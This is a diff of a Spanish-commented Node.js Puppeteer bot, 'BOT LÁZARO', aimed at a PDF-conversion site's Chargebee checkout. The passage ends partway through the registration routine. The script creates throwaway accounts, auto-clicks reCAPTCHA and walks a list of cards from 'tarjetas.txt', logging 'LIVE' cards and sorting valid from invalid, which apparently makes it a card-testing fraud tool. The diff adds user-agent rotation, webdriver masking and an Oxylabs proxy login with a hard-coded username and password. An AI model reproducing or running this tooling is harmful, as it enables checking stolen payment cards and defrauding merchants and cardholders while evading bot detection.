@@ -1,5 +1,5 @@
 // ======================================================
-//  ⚡ CYBER NEON THEME — BY McMetric (INTEGRADO)
+//  ⚡ CYBER NEON THEME — BY McMetric & Anthony98
 // ======================================================
 const COLORS_NEON = {
     reset: "\x1b[0m",
@@ -28,10 +28,12 @@ console.error = (...msg) => {
     _error(COLORS_NEON.neonPink + COLORS_NEON.bright + "✖ ERROR: " + msg.join(" ") + COLORS_NEON.reset);
 };
 
-// 🔥 Banner Cyber-NEON
+// ======================================================
+// 🟣 BANNER PRINCIPAL
+// ======================================================
+
 console.log(
-    COLORS_NEON.neonMagenta +
-    COLORS_NEON.bright +
+    COLORS_NEON.neonMagenta + COLORS_NEON.bright +
 `
 ╔══════════════════════════════════════════════════════════════════════╗
 ║                                                                      ║
@@ -40,10 +42,9 @@ console.log(
 ║    ██║  ██║██║   ██║   ██║   ███████║   ██║█████╗  ██████╔╝█████╗    ║
 ║    ██║  ██║██║   ██║   ██║   ██╔══██║   ██║██╔══╝  ██╔══██╗██╔══╝    ║
 ║    ██████╔╝╚██████╔╝   ██║   ██║  ██║██╗██║███████╗██║  ██║███████╗  ║
-║    ╚═════╝  ╚═════╝    ╚═╝   ╚═╝  ╚═╝╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚══════╝  ║
+║    ╚═════╝  ╚═════╝    ╚═╝   ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚══════╝  ║
 ║                                                                      ║
-║           🟣 BOT LAZARO — CYBER NEON MODE ACTIVATED 🟣               ║
-║                        by McMetric & Anthony98                        ║
+║           🟣 BOT LÁZARO — CYBER NEON MODE ACTIVATED                  ║
 ║                                                                      ║
 ╚══════════════════════════════════════════════════════════════════════╝
 `
@@ -51,129 +52,136 @@ console.log(
 );
 
 // ======================================================
-// FIN DEL TEMA CYBER NEON
+// 🔧 DEPENDENCIAS
 // ======================================================
-
-// 🔥 BOT LAZARO — ULTRA FINAL (TERMUX + XVFB Edition)
-// FLUJO COMPLETO + RÁPIDO + CLOSE KILLER + LOOP DE CUENTAS
-// + ELIMINAR TARJETAS + VALIDAS/INVALIDAS + ROTACIÓN IP MANUAL
-// + FORMULARIO LENTO HUMANO + AUTOREPARACIÓN + XVFB SUPPORT
-
 const puppeteer = require("puppeteer-core");
 const fs = require("fs").promises;
 const path = require("path");
 const { execSync } = require("child_process");
 
+// ======================================================
+// 🎭 USER-AGENT ROTATOR — REALISTA & ANTI-DETECT
+// ======================================================
+const USER_AGENTS = [
+    // Windows Chrome
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.60 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.57 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.140 Safari/537.36",
+    // Android Chrome
+    "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.47 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 12; SM-A528B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.180 Mobile Safari/537.36",
+    // Edge camuflado
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.2124.7"
+];
 
+function getRandomUserAgent() {
+    return USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)];
+}
 
 // ======================================================
-// 🔥 CAPTCHA SOLVER UNIVERSAL
+// 🔥 CAPTCHA SOLVER ULTRA ESTABLE
 // ======================================================
+
 class CaptchaSolver {
     constructor(page, log = console.log) {
         this.page = page;
         this.log = log;
     }
 
-    delay(ms) { return new Promise(res => setTimeout(res, ms)); }
+    delay(ms) { return new Promise(r => setTimeout(r, ms)); }
 
     async solve() {
-    try {
-        await this.log("🔍 Buscando CAPTCHA (modo estable real)...");
+        try {
+            await this.log("🔍 Buscando CAPTCHA (modo estable real)...");
 
-        let anchor = null;
-        let frameFound = null;
+            let anchor = null;
+            let frameFound = null;
 
-        // 🔥 Esperar a que el recaptcha REAL exista (hasta 120 intentos)
-        for (let i = 0; i < 120; i++) {
-            for (const f of this.page.frames()) {
-                try {
-                    const candidate = await f.$("#recaptcha-anchor");
-                    if (candidate) {
-                        frameFound = f;
-                        anchor = candidate;
-                        break;
-                    }
-                } catch (_) {}
-            }
+            // 120 intentos → recaptcha real
+            for (let i = 0; i < 120; i++) {
 
-            // No existe todavía → esperar más  
-            if (!anchor) {
-                if (i % 20 === 0)
-                    await this.log(`⏳ CAPTCHA aún no aparece... (${i}/120)`);
+                for (const f of this.page.frames()) {
+                    try {
+                        const candidate = await f.$("#recaptcha-anchor");
+                        if (candidate) {
+                            anchor = candidate;
+                            frameFound = f;
+                            break;
+                        }
+                    } catch (_) {}
+                }
 
-                await this.delay(250);
-                continue;
-            }
+                if (!anchor) {
+                    if (i % 20 === 0)
+                        await this.log(`⏳ CAPTCHA aún no aparece... (${i}/120)`);
+                    await this.delay(250);
+                    continue;
+                }
 
-            // Si existe, verificar si está visible y activo
-            try {
+                // Confirmar visibilidad
                 const isHidden = await frameFound.evaluate(() => {
                     const el = document.querySelector("#recaptcha-anchor");
                     return el && el.getAttribute("aria-hidden") === "true";
-                });
+                }).catch(() => false);
 
                 if (isHidden) {
                     await this.delay(200);
-                    continue; // Aún no está listo
+                    continue;
                 }
-            } catch (_) {}
 
-            // Verificar boundingBox real
-            const box = await anchor.boundingBox().catch(() => null);
-            if (!box || box.width === 0 || box.height === 0) {
-                await this.delay(200);
-                continue;
+                const box = await anchor.boundingBox().catch(() => null);
+
+                if (!box || box.width === 0 || box.height === 0) {
+                    await this.delay(200);
+                    continue;
+                }
+
+                break;
             }
 
-            break; // CAPTCHA listo
-        }
-
-        if (!anchor) {
-            await this.log("⏩ No hay CAPTCHA real en esta página, continuando...");
-            return true;
-        }
-
-        await this.log("🟢 CAPTCHA listo — resolviendo...");
-
-        // 🔥 Resolver captcha
-        const box = await anchor.boundingBox();
-        await this.page.mouse.move(box.x + box.width/2, box.y + box.height/2);
-        await this.delay(100);
-        await this.page.mouse.down();
-        await this.delay(100);
-        await this.page.mouse.up();
-
-        // Verificar si se resolvió
-        for (let i = 0; i < 40; i++) {
-            const checked = await frameFound.evaluate(() => {
-                const el = document.querySelector("#recaptcha-anchor");
-                return el && el.getAttribute("aria-checked") === "true";
-            }).catch(() => false);
-
-            if (checked) {
-                await this.log("🟣 CAPTCHA COMPLETAMENTE RESUELTO ✔✔✔");
+            if (!anchor) {
+                await this.log("⏩ No hay CAPTCHA, continuando...");
                 return true;
             }
 
-            await this.delay(300);
+            await this.log("🟢 CAPTCHA listo — resolviendo...");
+
+            const box = await anchor.boundingBox();
+
+            await this.page.mouse.move(box.x + box.width / 2, box.y + box.height / 2);
+            await this.delay(100);
+            await this.page.mouse.down();
+            await this.delay(80);
+            await this.page.mouse.up();
+
+            for (let i = 0; i < 40; i++) {
+                const ok = await frameFound.evaluate(() => {
+                    const el = document.querySelector("#recaptcha-anchor");
+                    return el && el.getAttribute("aria-checked") === "true";
+                }).catch(() => false);
+
+                if (ok) {
+                    await this.log("🟣 CAPTCHA COMPLETAMENTE RESUELTO ✔✔✔");
+                    return true;
+                }
+
+                await this.delay(300);
+            }
+
+            await this.log("⚠ CAPTCHA no marcó como resuelto, continuando...");
+            return true;
+
+        } catch (e) {
+            await this.log("❌ Error CAPTCHA: " + e.message);
+            return true;
         }
-
-        await this.log("⚠ CAPTCHA no marcó como resuelto, pero continuaremos...");
-        return true;
-
-    } catch (e) {
-        await this.log("❌ Error en CAPTCHA: " + e.message);
-        return true;
     }
 }
 
-}
-
-
 // ======================================================
-// 🔥 KATY20 – BRAIN ENGINE
+// 🧠 KATY20 — MOTOR PRINCIPAL DEL BOT
 // ======================================================
+
 class PDFSimpliBot {
     constructor() {
         this.baseDir = "/home/faelo/botdata";
@@ -199,7 +207,6 @@ class PDFSimpliBot {
         this.cuentasProcesadas = 0;
         this.cardsThisAccount = 0;
     }
-
     delay(ms) {
         return new Promise(res => setTimeout(res, ms));
     }
@@ -207,6 +214,12 @@ class PDFSimpliBot {
     async log(msg) {
         console.log(msg);
         await fs.appendFile(this.logFile, `[${new Date().toISOString()}] ${msg}\n`);
+    }
+
+    async ensureDir(d) {
+        try {
+            await fs.mkdir(d, { recursive: true });
+        } catch (_) {}
     }
 
     async limpiarChromeTresVeces() {
@@ -222,24 +235,9 @@ class PDFSimpliBot {
             await this.delay(800);
         }
     }
-      // 👇 ESTE MÉTODO NO EXISTÍA — AQUÍ ESTÁ EL FIX
+
     async limpiarNavegador() {
         await this.limpiarChromeTresVeces();
-    }
-
-    async restartBrowser() {
-        // ...
-    }
-
-    async executeFlowCuenta() {
-        // ...
-    }
-
-
-    async ensureDir(d) {
-        try {
-            await fs.mkdir(d, { recursive: true });
-        } catch (_) {}
     }
 
     async findChromium() {
@@ -264,29 +262,10 @@ class PDFSimpliBot {
         }
         return null;
     }
-// =============================================================
-// ESPERAR QUE EL IFRAME DE TARJETA SE ESTABILICE (ANTI RE-RENDER)
-// =============================================================
-async waitForCardIframeStable() {
-    for (let i = 0; i < 40; i++) {
-        const frames = this.page.frames();
-        const target = frames.find(f =>
-            f.url().includes("chargebee") ||
-            f.url().includes("billing") ||
-            f.url().includes("js/iframe") ||
-            f.url().match(/checkout|card|payment/i)
-        );
 
-        if (target) return target;
-
-        await this.delay(300);
-    }
-
-    throw new Error("❌ No se pudo detectar el iframe de tarjeta (Chargebee)");
-}
-
-
-    // ✅ ULTRACLICK VA AQUÍ, DENTRO DE LA CLASE
+    // =============================================================
+    // ULTRACLICK (RETORNA CLICK REAL AUN EN PÁGINAS CAMBIANTES)
+    // =============================================================
     async ultraClick(selector) {
         for (let i = 0; i < 5; i++) {
             const el = await this.deepFind(selector);
@@ -298,7 +277,7 @@ async waitForCardIframeStable() {
                             box.x + box.width / 2,
                             box.y + box.height / 2
                         );
-                        await this.delay(70);
+                        await this.delay(80);
                         await this.page.mouse.down();
                         await this.delay(60);
                         await this.page.mouse.up();
@@ -312,63 +291,81 @@ async waitForCardIframeStable() {
             await this.delay(350);
         }
         return false;
-     }
-
+    }
 
     // =============================================================
-    // INIT CON PROXY OXYLABS (DEL ARCHIVO ARMENIA4)
+    // DETECCIÓN DEL IFRAME DE TARJETA (ChargeBee)
+    // =============================================================
+    async waitForCardIframeStable() {
+        for (let i = 0; i < 40; i++) {
+            const frames = this.page.frames();
+            const target = frames.find(f =>
+                f.url().includes("chargebee") ||
+                f.url().includes("billing") ||
+                f.url().includes("js/iframe") ||
+                f.url().match(/checkout|card|payment/i)
+            );
+
+            if (target) return target;
+
+            await this.delay(300);
+        }
+
+        throw new Error("❌ No se pudo detectar el iframe de tarjeta (Chargebee)");
+    }
+
+    // =============================================================
+    // INICIALIZACIÓN DEL BROWSER (PROXY + USER AGENT + ANTI-DETECT)
     // =============================================================
     async initialize() {
 
-    await this.ensureDir(this.baseDir);
-    await this.ensureDir(path.join(this.baseDir, "documents"));
-    await this.ensureDir(path.join(this.baseDir, "downloads"));
+        await this.ensureDir(this.baseDir);
+        await this.ensureDir(path.join(this.baseDir, "documents"));
+        await this.ensureDir(path.join(this.baseDir, "downloads"));
 
-    const chromium = await this.findChromium();
+        const chromium = await this.findChromium();
 
-    this.browser = await puppeteer.launch({
-        executablePath: chromium,
-        headless: false,
-        ignoreHTTPSErrors: true,
-        defaultViewport: null,
-        args: [
-            "--incognito",
-            "--no-sandbox",
-            "--disable-setuid-sandbox",
-            "--disable-infobars",
-            "--disable-web-security",
-            "--ignore-certificate-errors",
-            "--start-maximized",
-            "--window-size=1920,1080",
-            "--proxy-server=http://dc.oxylabs.io:8000"
+        // UA ALEATORIO REALISTA
+        const USER_AGENT = getRandomUserAgent();
 
+        this.browser = await puppeteer.launch({
+            executablePath: chromium,
+            headless: false,
+            ignoreHTTPSErrors: true,
+            defaultViewport: null,
+            args: [
+                "--incognito",
+                "--no-sandbox",
+                "--disable-setuid-sandbox",
+                "--disable-infobars",
+                "--disable-web-security",
+                "--ignore-certificate-errors",
+                "--start-maximized",
+                "--window-size=1920,1080",
+                "--disable-blink-features=AutomationControlled",
+                "--proxy-server=http://dc.oxylabs.io:8000"
+            ]
+        });
 
-        ]
-    });
+        this.page = await this.browser.newPage();
 
-    this.page = await this.browser.newPage();
+        // AUTENTICAR PROXY
+        await this.page.authenticate({
+            username: "user-zabuza_Z60hQ",
+            password: "Tuning_9718ZZ"
+        });
 
-await this.page.authenticate({
-    username: "user-zabuza_Z60hQ",
-    password: "Tuning_9718ZZ"
-});
+        // SET USER AGENT
+        await this.page.setUserAgent(USER_AGENT);
 
+        // ANTI-DETECT webdriver
+        await this.page.evaluateOnNewDocument(() => {
+            Object.defineProperty(navigator, "webdriver", { get: () => undefined });
+        });
 
-
-
-
-    await this.page.setUserAgent(
-        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 " +
-        "(KHTML, like Gecko) Chrome/122.0.6261.57 Safari/537.36"
-    );
-
-    await this.page.evaluateOnNewDocument(() => {
-        Object.defineProperty(navigator, "webdriver", { get: () => undefined });
-    });
-
-    await this.log("🚀 Chrome inicializado con Oxylabs funcionando");
-}
-   // =============================================================
+        await this.log("🚀 Chrome inicializado con Oxylabs y User-Agent rotatorio");
+    }
+    // =============================================================
     // TARJETAS
     // =============================================================
     async loadAllTarjetas() {
@@ -401,9 +398,6 @@ await this.page.authenticate({
         await this.log(`💾 LIVE GUARDADA: ${t.cedula}`);
     }
 
-    // =============================================================
-    // ELIMINAR TARJETA PROCESADA
-    // =============================================================
     async eliminarTarjetaDelArchivo(tarjeta) {
         try {
             const file = path.join(this.baseDir, "tarjetas.txt");
@@ -424,9 +418,6 @@ await this.page.authenticate({
         }
     }
 
-    // =============================================================
-    // GUARDAR TARJETA VALIDA O INVALIDA
-    // =============================================================
     async guardarTarjetaEnArchivo(tarjeta, esValida) {
         try {
             const file = path.join(
@@ -451,363 +442,337 @@ await this.page.authenticate({
         }
     }
 
+    // =============================================================
+    // SUBIR PDF ULTRA ESTABLE
+    // =============================================================
     async uploadPDF() {
-    await this.log("📄 Buscando input file (modo estable)...");
+        await this.log("📄 Buscando input file (modo estable)...");
 
-    let input = null;
+        let input = null;
 
-    // Buscar input tipo archivo (máximo 50 intentos)
-    for (let i = 0; i < 50; i++) {
-        input = await this.deepFind('input[type="file"]');
-
-        if (input) {
-            const disabled = await input.evaluate(el => el.disabled);
-            if (!disabled) break;
+        for (let i = 0; i < 50; i++) {
+            input = await this.deepFind('input[type="file"]');
+            if (input) {
+                const disabled = await input.evaluate(el => el.disabled);
+                if (!disabled) break;
+            }
+            if (i % 10 === 0)
+                await this.log(`⏳ Esperando input real... (${i}/50)`);
+            await this.delay(200);
         }
 
-        if (i % 10 === 0)
-            await this.log(`⏳ Esperando input real... (${i}/50)`);
+        if (!input) throw new Error("❌ Input file no encontrado después de 50 intentos");
 
-        await this.delay(200);
-    }
+        const docs = path.join(this.baseDir, "documents");
+        const files = await fs.readdir(docs);
+        const pdf = files.find(f => f.endsWith(".pdf"));
+        if (!pdf) throw new Error("❌ No hay PDF en carpeta documents");
 
-    if (!input) throw new Error("❌ Input file no encontrado después de 50 intentos");
+        const pdfPath = path.join(docs, pdf);
+        await this.log(`📁 Subiendo PDF: ${pdfPath}`);
 
-    // Cargar PDF
-    const docs = path.join(this.baseDir, "documents");
-    const files = await fs.readdir(docs);
-    const pdf = files.find(f => f.endsWith(".pdf"));
-    if (!pdf) throw new Error("❌ No hay PDF en carpeta documents");
+        let uploadSuccess = false;
 
-    const pdfPath = path.join(docs, pdf);
-    await this.log(`📁 Subiendo PDF: ${pdfPath}`);
+        for (let intento = 1; intento <= 5; intento++) {
+            try {
+                const [nav] = await Promise.all([
+                    this.page.waitForNavigation({
+                        waitUntil: "networkidle2",
+                        timeout: 15000
+                    }).catch(() => null),
+                    input.uploadFile(pdfPath)
+                ]);
 
-    // SUBIDA CON ESPERA DE NAVEGACIÓN
-    let uploadSuccess = false;
+                uploadSuccess = true;
+                break;
 
-    for (let intento = 1; intento <= 5; intento++) {
-        try {
-            // ⚡ IMPORTANTE: esperar navigation sin romper ejecución
-            const [nav] = await Promise.all([
-                this.page.waitForNavigation({
-                    waitUntil: "networkidle2",
-                    timeout: 15000
-                }).catch(() => null),  // ← evitar error "Execution context destroyed"
-
-                input.uploadFile(pdfPath)
-            ]);
-
-            uploadSuccess = true;
-            break;
-
-        } catch (err) {
-            await this.log(`⚠️ Intento ${intento}/5 fallido al subir PDF`);
-            await this.delay(500);
+            } catch (err) {
+                await this.log(`⚠️ Intento ${intento}/5 fallido al subir PDF`);
+                await this.delay(500);
+            }
         }
+
+        if (!uploadSuccess) throw new Error("❌ Falló la subida del PDF después de 5 intentos");
+
+        await this.log("⏳ Esperando a que la página termine de procesar...");
+        await this.delay(3000);
+
+        for (let i = 0; i < 30; i++) {
+            const content = await this.page.content().catch(() => "");
+            if (!content.includes("loading") && !content.includes("spinner"))
+                break;
+
+            await this.delay(300);
+        }
+
+        await this.log("🟢 PDF subido y procesado correctamente (modo navegación estable)");
     }
-
-    if (!uploadSuccess) throw new Error("❌ Falló la subida del PDF después de 5 intentos");
-
-    // ⚠️ Muy importante: no tocar el DOM todavía
-    await this.log("⏳ Esperando a que la página termine de procesar...");
-
-    // Esperar que desaparezcan loaders, pero SIN evaluate directo inmediato
-    await this.delay(3000);
-
-    for (let i = 0; i < 30; i++) {
-        const content = await this.page.content().catch(() => "");
-        if (!content.includes("loading") && !content.includes("spinner"))
-            break;
-
-        await this.delay(300);
-    }
-
-    await this.log("🟢 PDF subido y procesado correctamente (modo navegación estable)");
-}
-
-
 
     // =============================================================
-// GET STARTED — MODO ULTRA SIMPLE
-// Espera 20 segundos antes de buscar y clickear
-// =============================================================
-async clickLetsGetStarted() {
-    await this.log("🔍 Buscando GET STARTED (modo estable)...");
+    // GET STARTED
+    // =============================================================
+    async clickLetsGetStarted() {
+        await this.log("🔍 Buscando GET STARTED (modo estable)...");
 
-    let btn = null;
+        let btn = null;
 
-    // Buscar el botón hasta 120 intentos (unos 36 segundos)
-    for (let i = 0; i < 120; i++) {
-        try {
-            btn =
-                await this.deepFind('#preEditPop') ||
-                await this.deepFind("button[id*='start' i]") ||
-                await this.deepFind("button[class*='start' i]") ||
-                await this.deepFind("a[id*='start' i]") ||
-                await this.deepFind("div[id*='start' i]");
+        for (let i = 0; i < 120; i++) {
+            try {
+                btn =
+                    await this.deepFind('#preEditPop') ||
+                    await this.deepFind("button[id*='start' i]") ||
+                    await this.deepFind("button[class*='start' i]") ||
+                    await this.deepFind("a[id*='start' i]") ||
+                    await this.deepFind("div[id*='start' i]");
 
-            // Si aparece y tiene tamaño real → OK
-            if (btn) {
-                const box = await btn.boundingBox().catch(() => null);
-                if (box && box.width > 0 && box.height > 0) break;
+                if (btn) {
+                    const box = await btn.boundingBox().catch(() => null);
+                    if (box && box.width > 0 && box.height > 0) break;
+                }
+
+            } catch (e) {
+                if (e.message.includes("Execution context was destroyed")) {
+                    await this.log("⚠️ Página recargó durante GET STARTED — reintentando...");
+                }
             }
 
-        } catch (e) {
-            if (e.message.includes("Execution context was destroyed")) {
-                await this.log("⚠️ Página recargó durante GET STARTED — reintentando...");
-            }
-        }
-
-        await this.delay(300);
-    }
-
-    if (!btn) throw new Error("❌ GET STARTED nunca apareció (modo estable)");
-
-    // Scroll al botón
-    await this.page.evaluate(el =>
-        el.scrollIntoView({ behavior: "instant", block: "center" })
-    , btn).catch(() => {});
-
-    await this.delay(100);
-
-    // Clic estable
-    const box = await btn.boundingBox().catch(() => null);
-
-    if (box) {
-        await this.page.mouse.move(box.x + box.width / 2, box.y + box.height / 2);
-        await this.delay(80);
-        await this.page.mouse.down();
-        await this.delay(60);
-        await this.page.mouse.up();
-    } else {
-        await btn.click().catch(() => {});
-    }
-
-    await this.log("🟢 GET STARTED presionado correctamente (modo estable)");
-    await this.delay(3000);
-}
-
-
-// =============================================================
-// CONVERT — MODO SIMPLE DEFINITIVO
-// Espera 20 segundos ANTES de buscar Convert
-// =============================================================
-async clickConvert() {
-    await this.log("⏳ Esperando 20 segundos antes de buscar Convert...");
-    await this.delay(20000);  // 🔥🔥🔥 Espera fija de 20 segundos
-
-    await this.log("⚙️ Buscando botón Convert...");
-
-    let btn = null;
-
-    // Buscar hasta 40 intentos
-    for (let i = 0; i < 40; i++) {
-        btn =
-            await this.deepFind("#ConvertContinue") ||
-            await this.deepFind("button[data-test='convert']") ||
-            await this.deepFind(".button-convert") ||
-            await this.deepFind("button[id*='convert' i]") ||
-            await this.deepFind("a[id*='convert' i]") ||
-            await this.deepFind("div[id*='convert' i]");
-
-        if (btn) break;
-
-        if (i % 10 === 0)
-            await this.log(`⏳ Aún no aparece Convert... (${i}/40)`);
-
-        await this.delay(300);
-    }
-
-    if (!btn)
-        throw new Error("❌ Convert no apareció después de 20s + 40 intentos");
-
-    // Scroll y click estable
-    try {
-        await this.page.evaluate(el =>
-            el.scrollIntoView({ behavior: "instant", block: "center" })
-        , btn);
-    } catch (_) {}
-
-    const box = await btn.boundingBox();
-
-    if (box) {
-        await this.page.mouse.move(box.x + box.width / 2, box.y + box.height / 2);
-        await this.delay(70);
-        await this.page.mouse.down();
-        await this.delay(60);
-        await this.page.mouse.up();
-    } else {
-        await btn.click();
-    }
-
-    await this.log("🟢 Convert detectado y presionado correctamente");
-    await this.delay(4000);
-}
-
-// =============================================================
-// DOWNLOAD — DETECTA PRIMERO, LUEGO CLICKEA (SUPER ESTABLE)
-// =============================================================
-async clickDownload() {
-    await this.log("⬇️ Detectando botón DOWNLOAD...");
-
-    let btn = null;
-
-    for (let i = 0; i < 40; i++) {
-        try {
-            btn =
-                await this.deepFind("#congDwnaut") ||
-                await this.deepFind("button[id*='download' i]") ||
-                await this.deepFind("a[id*='download' i]") ||
-                await this.deepFind("div[id*='download' i]");
-
-            if (btn) {
-                const box = await btn.boundingBox();
-                if (box) break;
-            }
-
-        } catch (e) {
-            if (e.message.includes("Execution context was destroyed")) {
-                await this.log("⚠️ Página recargó durante DOWNLOAD — reintentando...");
-                await this.delay(300);
-                continue;
-            }
-        }
-
-        if (i % 10 === 0)
-            await this.log(`⏳ Esperando botón DOWNLOAD... (${i}/40)`);
-
-        await this.delay(350);
-    }
-
-    if (!btn) {
-        await this.log("⚠️ DOWNLOAD no apareció realmente");
-        return false;
-    }
-
-    // Configurar ruta de descarga
-    await this.page._client().send("Page.setDownloadBehavior", {
-        behavior: "allow",
-        downloadPath: path.join(this.baseDir, "downloads"),
-    });
-
-    // Scroll y clic
-    try {
-        await this.page.evaluate(el =>
-            el.scrollIntoView({ behavior: "instant", block: "center" })
-        , btn);
-    } catch (_) {}
-
-    const box = await btn.boundingBox();
-    if (box) {
-        await this.page.mouse.move(box.x + box.width / 2, box.y + box.height / 2);
-        await this.delay(70);
-        await this.page.mouse.down();
-        await this.delay(60);
-        await this.page.mouse.up();
-    } else {
-        await btn.click();
-    }
-
-    await this.log("📥 DOWNLOAD presionado correctamente");
-    await this.delay(4500);
-    return true;
-}
- async handleRegistration() {
-    await this.log("🧑‍💻 Registro...");
-
-    // Esperar a que los inputs existan realmente
-    let emailInput = null;
-    let passInput = null;
-
-    for (let i = 0; i < 60; i++) {
-        emailInput = await this.deepFind("#email");
-        passInput  = await this.deepFind("#password");
-
-        if (emailInput && passInput) break;
-
-        if (i % 15 === 0)
-            await this.log(`⏳ Esperando formulario real... (${i}/60)`);
-
-        await this.delay(250);
-    }
-
-    if (!emailInput || !passInput) {
-        await this.log("✔️ No pidió registro");
-        return;
-    }
-
-    // Generar correo y contraseña
-    const email = `user${Date.now()}@gmail.com`;
-    const pass  = "P" + Math.random().toString(36).slice(2, 10) + "!";
-
-    // === EMAIL ===
-    await emailInput.click({ clickCount: 3 });
-    await emailInput.type(email, { delay: 35 });
-
-    // === CONTRASEÑA SUPER ESTABLE (ANTI-BORRADO REAL) ===
-    for (let intento = 1; intento <= 10; intento++) {
-
-        // buscar nuevamente el input por si fue re-renderizado
-        passInput = await this.deepFind("#password");
-        if (!passInput) {
-            await this.log("⚠️ Campo password desapareció — reintentando...");
             await this.delay(300);
-            continue;
         }
 
-        // escribir
-        await passInput.click({ clickCount: 3 });
-        await passInput.type(pass, { delay: 30 });
+        if (!btn)
+            throw new Error("❌ GET STARTED nunca apareció (modo estable)");
 
-        // esperar por re-render
-        await this.delay(350);
+        try {
+            await this.page.evaluate(el =>
+                el.scrollIntoView({ behavior: "instant", block: "center" })
+            , btn);
+        } catch (_) {}
 
-        // Verificar si quedó escrita o si la página la borró
-        const typed = await passInput.evaluate(el => el.value || "");
+        await this.delay(100);
 
-        if (typed === pass) {
-            await this.log("🟢 Contraseña quedó escrita correctamente (modo estable)");
-            break;
-        }
-
-        await this.log(`⚠️ Página borró la contraseña → retry (${intento}/10)`);
-    }
-
-    // === SIGN UP ===
-    await this.log("🔍 Buscando botón SIGN UP...");
-    let btn = null;
-
-    for (let i = 0; i < 40; i++) {
-        btn = await this.deepFind("#sign-up");
-        if (btn) break;
-        await this.delay(200);
-    }
-
-    if (btn) {
-        const box = await btn.boundingBox();
+        const box = await btn.boundingBox().catch(() => null);
         if (box) {
             await this.page.mouse.move(box.x + box.width / 2, box.y + box.height / 2);
-            await this.delay(50);
+            await this.delay(70);
             await this.page.mouse.down();
-            await this.delay(50);
+            await this.delay(60);
+            await this.page.mouse.up();
+        } else {
+            await btn.click().catch(() => {});
+        }
+
+        await this.log("🟢 GET STARTED presionado correctamente (modo estable)");
+        await this.delay(3000);
+    }
+
+    // =============================================================
+    // CONVERT
+    // =============================================================
+    async clickConvert() {
+        await this.log("⏳ Esperando 20 segundos antes de buscar Convert...");
+        await this.delay(20000);
+
+        await this.log("⚙️ Buscando botón Convert...");
+
+        let btn = null;
+
+        for (let i = 0; i < 40; i++) {
+            btn =
+                await this.deepFind("#ConvertContinue") ||
+                await this.deepFind("button[data-test='convert']") ||
+                await this.deepFind(".button-convert") ||
+                await this.deepFind("button[id*='convert' i]") ||
+                await this.deepFind("a[id*='convert' i]") ||
+                await this.deepFind("div[id*='convert' i]");
+
+            if (btn) break;
+
+            if (i % 10 === 0)
+                await this.log(`⏳ Aún no aparece Convert... (${i}/40)`);
+
+            await this.delay(300);
+        }
+
+        if (!btn)
+            throw new Error("❌ Convert no apareció después de 20s + 40 intentos");
+
+        try {
+            await this.page.evaluate(el =>
+                el.scrollIntoView({ behavior: "instant", block: "center" })
+            , btn);
+        } catch (_) {}
+
+        const box = await btn.boundingBox();
+
+        if (box) {
+            await this.page.mouse.move(box.x + box.width / 2, box.y + box.height / 2);
+            await this.delay(70);
+            await this.page.mouse.down();
+            await this.delay(60);
             await this.page.mouse.up();
         } else {
             await btn.click();
         }
+
+        await this.log("🟢 Convert detectado y presionado correctamente");
+        await this.delay(4000);
     }
 
-    await this.log("⏳ CAPTCHA...");
-    await this.delay(4000);
+    // =============================================================
+    // DOWNLOAD
+    // =============================================================
+    async clickDownload() {
+        await this.log("⬇️ Detectando botón DOWNLOAD...");
 
-    const solver = new CaptchaSolver(this.page, this.log.bind(this));
-    await solver.solve();
+        let btn = null;
 
-    await this.log(`🟢 Cuenta creada: ${email}`);
-    await this.delay(1500);
-}
+        for (let i = 0; i < 40; i++) {
+            try {
+                btn =
+                    await this.deepFind("#congDwnaut") ||
+                    await this.deepFind("button[id*='download' i]") ||
+                    await this.deepFind("a[id*='download' i]") ||
+                    await this.deepFind("div[id*='download' i]");
 
+                if (!btn) continue;
 
+                const box = await btn.boundingBox();
+                if (box) break;
 
+            } catch (e) {
+                if (e.message.includes("Execution context was destroyed")) {
+                    await this.log("⚠️ Página recargó durante DOWNLOAD — reintentando...");
+                    await this.delay(300);
+                    continue;
+                }
+            }
+
+            if (i % 10 === 0)
+                await this.log(`⏳ Esperando botón DOWNLOAD... (${i}/40)`);
+
+            await this.delay(350);
+        }
+
+        if (!btn) {
+            await this.log("⚠️ DOWNLOAD no apareció realmente");
+            return false;
+        }
+
+        await this.page._client().send("Page.setDownloadBehavior", {
+            behavior: "allow",
+            downloadPath: path.join(this.baseDir, "downloads"),
+        });
+
+        try {
+            await this.page.evaluate(el =>
+                el.scrollIntoView({ behavior: "instant", block: "center" })
+            , btn);
+        } catch (_) {}
+
+        const box = await btn.boundingBox();
+        if (box) {
+            await this.page.mouse.move(
+                box.x + box.width / 2,
+                box.y + box.height / 2
+            );
+            await this.delay(70);
+            await this.page.mouse.down();
+            await this.delay(60);
+            await this.page.mouse.up();
+        } else {
+            await btn.click();
+        }
+
+        await this.log("📥 DOWNLOAD presionado correctamente");
+        await this.delay(4500);
+        return true;
+    }
+
+    // =============================================================
+    // REGISTRO + CAPTCHA
+    // =============================================================
+    async handleRegistration() {
+        await this.log("🧑‍💻 Registro...");
+
+        let emailInput = null;
+        let passInput = null;
+
+        for (let i = 0; i < 60; i++) {
+            emailInput = await this.deepFind("#email");
+            passInput  = await this.deepFind("#password");
+
+            if (emailInput && passInput) break;
+
+            if (i % 15 === 0)
+                await this.log(`⏳ Esperando formulario real... (${i}/60)`);
+
+            await this.delay(250);
+        }
+
+        if (!emailInput || !passInput) {
+            await this.log("✔️ No pidió registro");
+            return;
+        }
+
+        const email = `user${Date.now()}@gmail.com`;
+        const pass  = "P" + Math.random().toString(36).slice(2, 10) + "!";
+
+        await emailInput.click({ clickCount: 3 });
+        await emailInput.type(email, { delay: 35 });
+
